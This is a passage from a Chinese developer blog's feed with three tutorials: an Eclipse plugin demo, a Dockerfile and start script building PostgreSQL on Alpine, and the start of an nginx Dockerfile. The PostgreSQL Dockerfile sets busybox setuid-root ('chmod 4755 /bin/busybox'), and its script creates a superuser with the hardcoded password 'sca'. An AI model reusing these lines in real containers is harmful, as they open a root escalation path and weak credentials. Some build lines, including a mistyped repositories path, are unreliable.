class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">&lt;?eclipse version=&quot;3.4&quot;?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   &lt;extension</span><br><span class="line">         point=&quot;org.eclipse.ui.commands&quot;&gt;</span><br><span class="line">      &lt;category</span><br><span class="line">            id=&quot;demo1.commands.category&quot;</span><br><span class="line">            name=&quot;Sample Category&quot;&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 这里定义一个command id为demo1.commands.sampleCommand --&gt;</span></span><br><span class="line">      &lt;command</span><br><span class="line">            categoryId=&quot;demo1.commands.category&quot;</span><br><span class="line">            name=&quot;Sample Command&quot;</span><br><span class="line">            id=&quot;demo1.commands.sampleCommand&quot;&gt; </span><br><span class="line">      <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">   &lt;extension</span><br><span class="line">         point=&quot;org.eclipse.ui.handlers&quot;&gt;</span><br><span class="line">     <span class="comment">&lt;!-- 将上面定义的command 指定handler处理器，也就是SampleHandler这个类 --&gt;</span></span><br><span class="line">      &lt;handler</span><br><span class="line">            class=&quot;demo1.handlers.SampleHandler&quot;</span><br><span class="line">            commandId=&quot;demo1.commands.sampleCommand&quot;&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">   &lt;extension</span><br><span class="line">         point=&quot;org.eclipse.ui.bindings&quot;&gt;</span><br><span class="line">      &lt;key</span><br><span class="line">            commandId=&quot;demo1.commands.sampleCommand&quot;</span><br><span class="line">            schemeId=&quot;org.eclipse.ui.defaultAcceleratorConfiguration&quot;</span><br><span class="line">            contextId=&quot;org.eclipse.ui.contexts.window&quot;</span><br><span class="line">            sequence=&quot;M1+6&quot;&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">   &lt;extension</span><br><span class="line">         point=&quot;org.eclipse.ui.menus&quot;&gt;</span><br><span class="line">      &lt;menuContribution</span><br><span class="line">            locationURI=&quot;menu:org.eclipse.ui.main.menu?after=additions&quot;&gt;</span><br><span class="line">        <span class="comment">&lt;!-- 指定一个菜单，菜单显示为Sample Menu --&gt;</span></span><br><span class="line">         &lt;menu</span><br><span class="line">               id=&quot;demo1.menus.sampleMenu&quot;</span><br><span class="line">               label=&quot;Sample Menu&quot;</span><br><span class="line">               mnemonic=&quot;M&quot;&gt;</span><br><span class="line">           <span class="comment">&lt;!-- 将前面注册的command绑定到这个菜单里面 --&gt;</span></span><br><span class="line">            &lt;command</span><br><span class="line">                  commandId=&quot;demo1.commands.sampleCommand&quot;</span><br><span class="line">                  id=&quot;demo1.menus.sampleCommand&quot;</span><br><span class="line">                  mnemonic=&quot;S&quot;&gt;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">menu</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">menuContribution</span>&gt;</span></span><br><span class="line">      &lt;menuContribution</span><br><span class="line">            locationURI=&quot;toolbar:org.eclipse.ui.main.toolbar?after=additions&quot;&gt;</span><br><span class="line">         &lt;toolbar</span><br><span class="line">               id=&quot;demo1.toolbars.sampleToolbar&quot;&gt;</span><br><span class="line">            &lt;command</span><br><span class="line">                  id=&quot;demo1.toolbars.sampleCommand&quot;</span><br><span class="line">                  commandId=&quot;demo1.commands.sampleCommand&quot;</span><br><span class="line">                  icon=&quot;icons/sample.png&quot;</span><br><span class="line">                  tooltip=&quot;Say hello world&quot;&gt;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">toolbar</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">menuContribution</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SampleHandler.java 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1.handlers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.commands.AbstractHandler;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.commands.ExecutionEvent;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.commands.ExecutionException;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.ui.IWorkbenchWindow;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.ui.handlers.HandlerUtil;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.jface.dialogs.MessageDialog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SampleHandler</span> <span class="keyword">extends</span> <span class="title">AbstractHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">execute</span><span class="params">(ExecutionEvent event)</span> <span class="keyword">throws</span> ExecutionException </span>&#123;</span><br><span class="line">IWorkbenchWindow window = HandlerUtil.getActiveWorkbenchWindowChecked(event);</span><br><span class="line">    <span class="comment">// 推送弹窗，打印Hello, This is a demo plugin!!!</span></span><br><span class="line">MessageDialog.openInformation(</span><br><span class="line">window.getShell(),</span><br><span class="line"><span class="string">&quot;Demo1&quot;</span>,</span><br><span class="line"><span class="string">&quot;Hello, This is a demo plugin!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一个Activator类，这个是对插件的生命周期进行管理</p><table><thead><tr><th>getDefault()</th><th>取得插件类的实例的方法。插件类是单例的，所以这个方法作为一个静态方法提供。</th></tr></thead><tbody><tr><td>start()</td><td>插件开始时的处理。</td></tr><tr><td>stop()</td><td>插件停止时的处理。</td></tr><tr><td>getLog()</td><td>log输出时取得ILog用的方法。</td></tr><tr><td>getImageRegistry()</td><td>取得管理插件内图像的ImageRegistry类。</td></tr><tr><td>getPerferenceStore()</td><td>取得保存插件设定的IPerferenceStore类。</td></tr><tr><td>getDialogSettings()</td><td>取得保存对话框设定的IDialogSettings类。</td></tr><tr><td>getWorkbench()</td><td>取得IWorkbench的实例。</td></tr></tbody></table><h2 id="执行调试插件"><a href="#执行调试插件" class="headerlink" title="执行调试插件"></a>执行调试插件</h2><p>点击左上角的绿色启动按钮</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624005737022.png"></div></div><p>可以看到会新打开一个带有插件的eclipse，可以看到在菜单栏已经有变化，就是插件生效了</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624005931465.png"></div></div><p>接下来我们点击菜单栏的Sample Command，可以看到以下输出</p><div class="tag-plugin image"><div class="image-bg"><img src="/2022/06/23/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95eclipse%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/image-20220624010043268.png"></div></div><p>到此，一个简单的eclipse插件就开发完毕了。</p><p>参考链接：</p><p>引入插件：<a href="https://blog.csdn.net/feinifi/article/details/103088082">https://blog.csdn.net/feinifi/article/details/103088082</a></p><p>插件开发：<a href="https://www.cnblogs.com/liuzhuo">https://www.cnblogs.com/liuzhuo</a></p><p>插件开发：<a href="https://blog.csdn.net/feinifi/article/details/106773644">https://blog.csdn.net/feinifi/article/details/106773644</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;​    这里主要记录如何手把手搭建一个eclipse的插件项目。&lt;/p&gt;
&lt;h2 id=&quot;引入插件&quot;&gt;&lt;a href=&quot;#引入插件&quot; cl</summary>
      
    
    
    
    <category term="eclipse plugins" scheme="http://fireflyingup.github.io/categories/eclipse-plugins/"/>
    
    
    <category term="eclipse" scheme="http://fireflyingup.github.io/tags/eclipse/"/>
    
  </entry>
  
  <entry>
    <title>dockerfile基于alpine构建postgresql镜像</title>
    <link href="http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BApostgresql%E9%95%9C%E5%83%8F/"/>
    <id>http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BApostgresql%E9%95%9C%E5%83%8F/</id>
    <published>2022-06-21T15:49:26.000Z</published>
    <updated>2023-12-19T01:39:45.548Z</updated>
    
    <content type="html"><![CDATA[<h2 id="坏境"><a href="#坏境" class="headerlink" title="坏境"></a>坏境</h2><p>docker：20.10.10</p><p>nginx：1.18.0</p><p>podtgres：10.21</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。</p><p>准备pgsql的源码包(<a href="https://ftp.postgresql.org/pub/source/v10.21/postgresql-10.21.tar.gz">版本直达</a>)，也可以去<a href="https://www.postgresql.org/ftp/source/">pgsql官网</a>处自行下载对应的版本。</p><p>准备一个初始化脚本，主要用于创建数据库，用户等等。</p><p>准备完之后文件里面内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">╰─$ ls -al</span><br><span class="line">total 50152</span><br><span class="line">drwxr-xr-x  8 guoying  staff       256 Jun 21 11:42 .</span><br><span class="line">drwxr-xr-x  7 guoying  staff       224 Jun 22 15:06 ..</span><br><span class="line">-rw-r--r--  1 guoying  staff      1408 Jun 21 22:45 Dockerfile</span><br><span class="line">-rw-r--r--  1 guoying  staff    108622 Jun 21 11:38 data.sql</span><br><span class="line">-rw-r--r--  1 guoying  staff       640 Jun 21 16:07 start.sh</span><br><span class="line">-rw-r--r--  1 guoying  staff      2897 Jun 21 11:38 index.sql</span><br><span class="line">-rw-r--r--  1 guoying  staff    128105 Jun 21 11:38 initdb.sql</span><br><span class="line">-rw-r--r--@ 1 guoying  staff  25419930 Jun 21 09:29 postgresql-10.21.tar.gz</span><br></pre></td></tr></table></figure><h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>这里直接展示整个dockerfile文件，已经对应的注释</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># build pgsql</span></span><br><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> <span class="keyword">user</span>=postgres</span><br><span class="line"><span class="keyword">ARG</span> group=postgres</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将必要文件移入镜像</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> postgresql-10.21.tar.gz /</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建组和用户 ps：pgsql不允许非root安装</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> addgroup -S <span class="variable">$&#123;group&#125;</span> &amp;&amp; adduser \</span></span><br><span class="line"><span class="bash">    --disabled-password \</span></span><br><span class="line"><span class="bash">    --gecos <span class="string">&quot;&quot;</span> \</span></span><br><span class="line"><span class="bash">    --home <span class="string">&quot;/home/postgres&quot;</span> \</span></span><br><span class="line"><span class="bash">    --ingroup <span class="string">&quot;<span class="variable">$&#123;group&#125;</span>&quot;</span> \</span></span><br><span class="line"><span class="bash">    --no-create-home \</span></span><br><span class="line"><span class="bash">    <span class="comment"># --uid &quot;$UID&quot; \</span></span></span><br><span class="line"><span class="bash">    <span class="string">&quot;<span class="variable">$&#123;user&#125;</span>&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 指定apk的aliyun源</span></span></span><br><span class="line">    echo <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span><br><span class="line">    echo <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/repositories &amp;&amp; \</span><br><span class="line">    apk update &amp;&amp; \</span><br><span class="line">    <span class="comment"># 安装所需要的环境</span></span><br><span class="line">    apk <span class="keyword">add</span><span class="bash"> --no-cache --virtual .build-deps \</span></span><br><span class="line"><span class="bash">    gcc \</span></span><br><span class="line"><span class="bash">    g++ \</span></span><br><span class="line"><span class="bash">    make \</span></span><br><span class="line"><span class="bash">    readline-dev \</span></span><br><span class="line"><span class="bash">    zlib-dev &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> /postgresql-10.21 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 编译 指定端口8888</span></span></span><br><span class="line">    ./configure --prefix=/sca/postgresql --with-pgport=<span class="number">8888</span> &amp;&amp; \</span><br><span class="line">    make &amp;&amp; make install &amp;&amp; \</span><br><span class="line">    <span class="comment"># 删除缓存和不用的文件</span></span><br><span class="line">    rm -rf /postgresql-<span class="number">10.21</span> &amp;&amp; \</span><br><span class="line">    rm -rf /var/lib/apk/* &amp;&amp; \</span><br><span class="line">    rm -rf /tmp/* &amp;&amp; \</span><br><span class="line">    apk del .build-deps \</span><br><span class="line">    gcc \</span><br><span class="line">    g++ \</span><br><span class="line">    make &amp;&amp; \</span><br><span class="line">    <span class="comment"># 重新安装运行所需要的依赖</span></span><br><span class="line">    apk <span class="keyword">add</span><span class="bash"> readline-dev &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 创建数据目录，pgsql的data会放在这个目录里面</span></span></span><br><span class="line">    mkdir /sca/data &amp;&amp; \</span><br><span class="line">    <span class="comment"># 赋予权限</span></span><br><span class="line">    chown -R $&#123;<span class="keyword">user</span>&#125;:$&#123;<span class="keyword">user</span>&#125; /sca &amp;&amp; \</span><br><span class="line">    chmod <span class="number">4755</span> /bin/busybox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定postgres用户</span></span><br><span class="line"><span class="keyword">USER</span> $&#123;<span class="keyword">user</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传递初始化sql和脚本到/sca目录下</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./initdb.sql /sca</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./data.sql /sca</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./start.sh /sca</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露你的端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意这个-w，得要。</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [ <span class="string">&quot;/sca/postgresql/bin/pg_ctl&quot;</span>, <span class="string">&quot;-D&quot;</span>, <span class="string">&quot;/sca/data&quot;</span>, <span class="string">&quot;-w&quot;</span>, <span class="string">&quot;start&quot;</span> ]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>start.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">port=8888</span><br><span class="line">data=/sca/data</span><br><span class="line">binpath=/sca/postgresql/bin</span><br><span class="line"><span class="comment"># 判断是否存在posegresql.conf 从而判断是否已经构建完初始化数据库</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$&#123;data&#125;</span>/postgresql.conf&quot;</span> ];<span class="keyword">then</span> </span><br><span class="line"> <span class="comment"># 调用initdb 构建初始化数据库</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;initdb begin&quot;</span> </span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/initdb -D <span class="variable">$&#123;data&#125;</span></span><br><span class="line">    <span class="built_in">echo</span> 1 &gt; <span class="variable">$&#123;data&#125;</span>/.init</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;initdb end&quot;</span> </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入初始化数据</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$&#123;data&#125;</span>/.init&quot;</span> ];<span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;start data install&quot;</span></span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/pg_ctl -D <span class="variable">$&#123;data&#125;</span> -w start </span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/psql -p<span class="variable">$&#123;port&#125;</span> -c <span class="string">&quot;create role sca with superuser login password &#x27;sca&#x27;&quot;</span> -d postgres</span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/createdb -p<span class="variable">$&#123;port&#125;</span> --encoding=UTF8 --owner=sca -e sca</span><br><span class="line">    <span class="comment"># $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;create extension pgcrypto;&quot; -d sca</span></span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/psql -Usca -dsca -p<span class="variable">$&#123;port&#125;</span> -a -f /sca/initdb.sql 1&gt;/dev/null</span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/psql -Usca -dsca -p<span class="variable">$&#123;port&#125;</span> -a -f /sca/data.sql 1&gt;/dev/null</span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/psql -p<span class="variable">$&#123;port&#125;</span> -c <span class="string">&quot;alter user sca with nosuperuser&quot;</span> -d postgres</span><br><span class="line">    rm -rf /sca/dbinit.sh</span><br><span class="line">    rm -rf /sca/data.sql</span><br><span class="line">    rm -rf /sca/initdb.sql</span><br><span class="line">    rm -rf <span class="variable">$&#123;data&#125;</span>/.init</span><br><span class="line">    <span class="variable">$&#123;binpath&#125;</span>/pg_ctl -D <span class="variable">$&#123;data&#125;</span> -m fast -w stop </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;end data install&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动pgsql，这里用pg_ctl会启动不了容器（原因不知，可能和进程有关）</span></span><br><span class="line"><span class="built_in">exec</span> <span class="variable">$&#123;binpath&#125;</span>/postgres -D <span class="variable">$&#123;data&#125;</span></span><br></pre></td></tr></table></figure><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>docker build -t fire-pgsql:v1.0.0 .</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>创建普通用户（无密码）：<a href="https://stackoverflow.com/questions/49955097/how-do-i-add-a-user-when-im-using-alpine-as-a-base-image">https://stackoverflow.com/questions/49955097/how-do-i-add-a-user-when-im-using-alpine-as-a-base-image</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;坏境&quot;&gt;&lt;a href=&quot;#坏境&quot; class=&quot;headerlink&quot; title=&quot;坏境&quot;&gt;&lt;/a&gt;坏境&lt;/h2&gt;&lt;p&gt;docker：20.10.10&lt;/p&gt;
&lt;p&gt;nginx：1.18.0&lt;/p&gt;
&lt;p&gt;podtgres：10.21&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="dockerfile" scheme="http://fireflyingup.github.io/categories/dockerfile/"/>
    
    
    <category term="postgresql" scheme="http://fireflyingup.github.io/tags/postgresql/"/>
    
  </entry>
  
  <entry>
    <title>dockerfile基于alpine构建nginx镜像</title>
    <link href="http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAnginx%E9%95%9C%E5%83%8F/"/>
    <id>http://fireflyingup.github.io/2022/06/21/dockerfile%E5%9F%BA%E4%BA%8Ealpine%E6%9E%84%E5%BB%BAnginx%E9%95%9C%E5%83%8F/</id>
    <published>2022-06-21T15:49:18.000Z</published>
    <updated>2023-12-19T01:39:50.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="坏境"><a href="#坏境" class="headerlink" title="坏境"></a>坏境</h2><p>docker：20.10.10</p><p>nginx：1.18.0</p><p>alpine：3.16.0</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。</p><p>准备nginx的源码包(<a href="https://nginx.org/download/nginx-1.18.0.tar.gz">版本直达</a>)，也可以去<a href="https://nginx.org/en/download.html">nginx官网</a>处自行下载对应的版本。</p><p>准备一个nginx.conf配置文件，里面主要包含了我们对nginx的一些配置，如下其中某些配置需要修改。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daemon off ;</span><br></pre></td></tr></table></figure><p>准备完之后文件里面内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╰─$ ls -al</span><br><span class="line">total 2056</span><br><span class="line">drwxr-xr-x  6 guoying  staff      192 Jun 22 10:07 .</span><br><span class="line">drwxr-xr-x  7 guoying  staff      224 Jun 22 15:06 ..</span><br><span class="line">-rw-r--r--  1 guoying  staff     1219 Jun 20 23:25 Dockerfile</span><br><span class="line">drwxr-xr-x  7 guoying  staff      224 Jun 20 10:44 dist  <span class="comment"># 前端文件夹</span></span><br><span class="line">-rw-r--r--  1 guoying  staff  1039530 Apr 21  2020 nginx-1.18.0.tar.gz</span><br><span class="line">-rw-r--r--  1 guoying  staff     4820 Jun 20 22:44 nginx.conf <span class="comment">#里面需要个daemon off;</span></span><br></pre></td></tr></table></figure><h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>这里直接展示整个dockerfile文件，已经对应的注释</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># build nginx</span></span><br><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.16</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将源码包考入的镜像的根目录下</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> nginx-1.18.0.tar.gz /</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置aliyun仓库</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot;</span> &gt; /etc/apk/repositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot;</span> &gt;&gt; /etc/apk/r epositories &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="comment"># 更新apk</span></span></span><br><span class="line">    apk update &amp;&amp; \</span><br><span class="line">    <span class="comment"># 安装必要依赖</span></span><br><span class="line">    apk <span class="keyword">add</span><span class="bash"> --no-cache --virtual .build-deps \</span></span><br><span class="line"><span class="bash">        gcc \</span></span><br><span class="line"><span class="bash">        libc-dev \</span></span><br><span class="line"><span class="bash">        make \</span></span><br><span class="line"><span class="bash">        openssl-dev \</span></span><br><span class="line"><span class="bash">        pcre-dev \</span></span><br><span class="line"><span class="bash">        zlib-dev \</span></span><br><span class="line"><span class="bash">        linux-headers \</span></span><br><span class="line"><span class="bash">        curl \</span></span><br><span class="line"><span class="bash">        gnupg \</span></span><br><span 